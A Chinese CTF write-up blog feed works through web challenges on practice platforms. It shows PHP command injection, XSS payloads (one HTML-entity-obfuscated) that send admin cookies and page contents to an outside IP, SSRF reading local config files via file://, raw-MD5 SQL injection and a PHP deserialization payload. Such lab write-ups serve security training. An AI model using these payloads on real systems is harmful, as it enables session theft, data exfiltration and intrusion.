class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是命令注入的套路了，咱们弹个 <code>shell</code> 玩玩。 <a href="https://www.anquanke.com/post/id/168667" target="_blank" rel="noopener">如何远程利用PHP绕过Filter以及WAF规则</a></p><p>弹了半天没弹出来，估计做了什么设置，还是老老实实读文件吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'ls -al\');'</span>);</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbaypcbqj20yo0cdtav.jpg" alt></p><p>发现 <code>flag3</code> 这个目录，看看里面有啥东西。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbd1c4sdj20qs09tgn9.jpg" alt></p><p> <code>root</code> 才能读 <code>flag3</code> ，有点提权的味道了。先看看 <code>meow.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *exec = argv[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *flag = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Usage: %s flag\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"We have cat to read file, And the meow to cat flag."</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">S</span>;</span></span><br><span class="line"><span class="keyword">if</span>(stat(exec, &amp;S) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Can not stat file %s\n"</span>, exec);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> uid = S.st_uid;</span><br><span class="line"><span class="keyword">gid_t</span> gid = S.st_gid;</span><br><span class="line"></span><br><span class="line">setuid(uid);</span><br><span class="line">seteuid(uid);</span><br><span class="line">setgid(gid);</span><br><span class="line">setegid(gid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(flag, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Can not open file %s\n"</span>, flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> readed = read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(readed &gt; <span class="number">0</span>) &#123;</span><br><span class="line">write(<span class="number">1</span>, buffer, readed);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就用这个程序读 <code>flag</code> 吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'./flag3/meow ./flag3/flag3\');'</span>);</span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><a href="https://webshell.hackme.inndy.tw/" target="_blank" rel="noopener">webshell</a></h2><p>这题挂掉了，修复了再做。</p><h2 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a><a href="https://command-executor.hackme.inndy.tw/" target="_blank" rel="noopener">command-executor</a></h2><p>单独写 wp</p><h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssme</a></h2><blockquote><p>XSS admin to steal flag</p></blockquote><p>都强调了 <code>xss</code> ，那就是打管理员 <code>cookie</code> 了。</p><p>不过还是扫一遍目录看看，以防丢失重要信息。</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w1ga3d3gj20a904bwew.jpg" alt></p><p>一登录进来就发现是个邮箱管理界面，而且<code>admin</code> 已经发了封欢迎邮件过来。</p><p>接下来就是给 <code>admin</code> 发封邮件，插入咱们的 <code>js</code> payload，把 <code>cookie</code> 偷过来。 </p><p>这里有个很有趣的点，可以自己给自己发邮件，这样就完全不用怀疑 <code>bot</code> 会出故障，自己打自己成功了再去打管理员是一个更好的选择。</p><p>题目很友好，直接提示了哪些字符不能用，而且显示了管理员是否阅读了该邮件。</p><p>简单尝试了一下，以下字符被过滤：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">script</span></span><br><span class="line">)</span><br><span class="line">onmouseover</span><br><span class="line">空格onload</span><br><span class="line">空格onerror</span><br><span class="line">&lt;iframe</span><br></pre></td></tr></table></figure><p>但还有个常用的：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">onload</span>=alert(1);&gt;</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=alert(1)&gt;</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=prompt(1)</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure><p>构造 <code>payload</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location='http://47.101.220.241:9999?cookie='+document.cookie"</span>&gt;</span><br><span class="line"></span><br><span class="line">或者将 <span class="string">""</span> 内的内容 HTML 实体编码下</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location.href=('http://47.101.220.241:9999?cookie='+document.cookie)"</span>&gt;</span><br><span class="line"></span><br><span class="line">如果没发现上面一些过滤是包含空格一起检测的，将失去大量合适 payload</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">""</span>onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"&gt;</span><br></pre></td></tr></table></figure><p>使用 xss 平台接收一下请求，或者直接用 nc 监听。</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w107xescj20ml04sjrq.jpg" alt></p><h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf leak</a></h2><blockquote><p>Steal flag from source code file</p></blockquote><p>提示是 flag 在源码里面，那我们先读一下页面的源代码看看。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location='http://47.101.220.241:9999?cookie='+btoa(document.body.innerHTML)"</span>&gt;</span><br><span class="line"></span><br><span class="line">发现 innerHTML 被过滤，那就 HTML 编码一下</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2e;&amp;#x32;&amp;#x32;&amp;#x30;&amp;#x2e;&amp;#x32;&amp;#x34;&amp;#x31;&amp;#x3a;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x3f;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3d;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29;"</span>&gt;</span><br></pre></td></tr></table></figure><p>拿到 HTML，有点残缺，自己改下标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-lg navbar-dark bg-dark d-flex"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>XSSRF<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;a class=" nav-link" href="sendmail.php"&gt;Send Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="mailbox.php"&gt;Mailbox&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="sentmail.php"&gt;Sent Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="setadmin.php"&gt;Set Admin&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">" nav-link"</span> <span class="attr">href</span>=<span class="string">"request.php"</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            &lt;/bGk &lt;/ul&gt; &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;span class=" navbar-texdCI Hello, admin (Administrator)&lt;/span&gt; &lt;/bGk &lt;li class="nav-item"&gt;</span><br><span class="line">            &lt;a class="nav-link" href="logout.php"&gt;Logout&lt;L2E &lt;/li&gt; &lt;/dWw &lt;/nav&gt; &lt;div class="containeciI </span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">" card text-white bg-darayI &lt;div class="</span><span class="attr">card-body</span>"&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"card-titlZSI </span></span></span><br><span class="line"><span class="tag"><span class="string">            4          &lt;/h2&gt;</span></span></span><br><span class="line">          &lt;h4&gt;From: &lt;a href=" sendmail.php?to=jj"&gt;jj&lt;/a&gt;&lt;/aDQ &lt;div class="card-text"&gt;&lt;svg onload="javascript:document.location='http://47.101.220.241:9999?cookie='+btoa(document.body.innerHTMLKSI &lt;/sdmc &lt;/daXY </span><br><span class="line">        <span class="tag">&lt;/<span class="name">daXY</span> </span></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">daXY</span></span></span><br></pre></td></tr></table></figure><p>发现有个 <code>request.php</code> ，无法直接访问，需要 <code>admin</code>。</p><p>想办法让真正的 <code>admin</code> 去访问一下，然后把相应的结果返回给我们。</p><p>既然都可以执行 <code>js</code> 代码了，那直接构造一个 <code>Ajax</code> 请求，这里用的是原生的 <code>Ajax</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://47.101.220.241:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">GET</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>();</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure><p>得到 <code>request.php</code> 访问接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"/request.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;textarea name=<span class="string">"url"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>有用的只有这一部分，传的参数是<code>url</code>，有没可能是文件包含呢？用 <code>file://</code> 协议试试。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://47.101.220.241:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>("<span class="attr">url</span>=<span class="string">file:///var/www/html/config.php</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure><p>成功拿到 <code>flag</code>，并提示我们下一个 <code>flag</code> 在 Redis 里。</p><h2 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf redis</a></h2><blockquote><p>Steal flag from redis</p></blockquote><p>有了上一题的 <code>ssrf</code> ，打内网 redis 也是水到渠成了。</p><p>先看一下之前的 <code>request.php</code> 源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span>(<span class="string">'common.php'</span>); </span><br><span class="line">admin_required(); </span><br><span class="line">$msg = []; </span><br><span class="line">$url = <span class="string">''</span>; </span><br><span class="line">$result = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $result = shell_exec(<span class="string">'curl -m 1 --connect-timeout 1 -s '</span> . escapeshellarg($url)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试一下 <code>gopher</code> 未授权打 redis。</p><p>这一部分单独总结一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;hide-and-seek&quot;&gt;&lt;a href=&quot;#hide-and-seek&quot; class=&quot;headerlink&quot; title=&quot;hide and seek&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://hackme.inndy.tw/&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ Writeup</title>
    <link href="https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/"/>
    <id>https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/</id>
    <published>2019-02-02T05:08:19.000Z</published>
    <updated>2019-04-04T01:55:58.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo curl --local-port 51 http://web.jarvisoj.com:32770/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 100&lt;/title&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Yeah!! Here's your flag:PCTF&#123;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><blockquote><p>md5</p></blockquote><p>header 头里面发现 hint: “select * from `admin` where password=’”.md5($pass,true).”‘“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line"><span class="comment">// raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</span></span><br></pre></td></tr></table></figure><p>搜索一下，发现有个牛逼的字符串： <code>ffifdyop</code></p><p><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p><p>传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=’’or’6�]��!r,��b’</p><p>成功闭合，得到万能密码，登录即可。</p><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><blockquote><p>反序列化</p></blockquote><p>通过 <code>/showimg.php?img=c2hvd2ltZy5waHA=</code> 可读取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// showing.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">$f = base64_decode($f);</span><br><span class="line"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> </span><br><span class="line">&amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span>&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">readfile($f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// shield.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造利用的 <code>pop</code> 链即可，<strong>payload</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"file"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><blockquote><p>有反引号的注入</p></blockquote><p>详见 <a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</a></p><h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><blockquote><p>upload + lfi </p></blockquote><p>扫了一遍目录，没发现什么文件，尝试 filter 读源码，也失败了</p><p>主题界面是一个图片上传，再加一个展示界面</p><p>配置信息给的这么清晰，有点可疑，然而并没有找到什么有用的洞</p><p>Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3</p><p>Warning: fopen(submi.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24</p><p>按理说是可以文件包含，php://filter/read=convert.base64-encode/resource=index</p><p>然而显示 Cross domain forbidden!，估计是加了啥子 waf，此路不通</p><p>fopen() 时应该是拼接了一个 “.php”，这里可以用 %00 绕过</p><p>fopen(index.jj): failed to open stream 绕过成功</p><p>图片只能上传 